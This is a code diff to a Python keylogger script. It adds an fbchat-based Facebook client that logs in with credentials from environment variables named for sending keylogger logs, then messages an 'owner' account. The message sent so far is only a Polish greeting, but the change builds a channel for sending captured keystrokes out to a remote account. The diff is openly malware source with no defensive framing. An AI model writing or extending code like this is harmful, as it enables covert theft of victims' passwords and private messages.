@@ -1,4 +1,17 @@
+import os
 import keyboard
+import fbchat
+
+
+class FacebookController(fbchat.Client):
+    def __init__(self, login, password, owner_uid):
+        super(FacebookController, self).__init__(login, password)
+
+        self.owner_uid = owner_uid
+
+    def send_to_owner(self, message):
+        self.send(self.owner_uid, message)
+
 
 class Keylogger(object):
     def __init__(self):
@@ -17,4 +30,8 @@ class Keylogger(object):
 
 
 k = Keylogger()
+controller = FacebookController(os.environ['FACEBOOK_LOGIN_TO_SEND_KEYLOGGER_LOGS_FROM'],
+                                os.environ['FACEBOOK_PASSWORD_TO_SEND_KEYLOGGER_LOGS_FROM'],
+                                os.environ['FACEBOOK_KEYLOGGER_OWNER_UID'])
+controller.send_to_owner('Wtam, jestem Pomocnikiem Magika. Do uslug')
 raw_input("Press Enter to continue...")
